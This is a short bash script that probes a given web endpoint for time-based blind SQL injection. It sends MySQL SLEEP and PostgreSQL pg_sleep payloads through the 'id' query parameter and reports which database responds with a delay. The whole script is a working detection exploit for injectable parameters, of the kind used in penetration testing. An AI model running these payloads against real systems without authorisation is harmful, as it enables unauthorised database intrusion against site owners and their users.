#!/bin/bash
set -euo pipefail

ENDPOINT="${1:?Usage: $0 <ENDPOINT>}"

# Extract base URL
BASE_URL=$(echo "$ENDPOINT" | sed 's/\?.*$//')

# MySQL SLEEP test
start=$(date +%s)
curl -s "${BASE_URL}?id=1' AND SLEEP(3)--+-" --max-time 10 > /dev/null 2>&1
elapsed=$(($(date +%s) - start))
if [ "$elapsed" -ge 3 ]; then
  echo "TIME_BLIND_MYSQL:${elapsed}s"
fi

# PostgreSQL pg_sleep test
start=$(date +%s)
curl -s "${BASE_URL}?id=1' AND pg_sleep(3)--" --max-time 10 > /dev/null 2>&1
elapsed2=$(($(date +%s) - start))
if [ "$elapsed2" -ge 3 ]; then
  echo "TIME_BLIND_PGSQL:${elapsed2}s"
fi
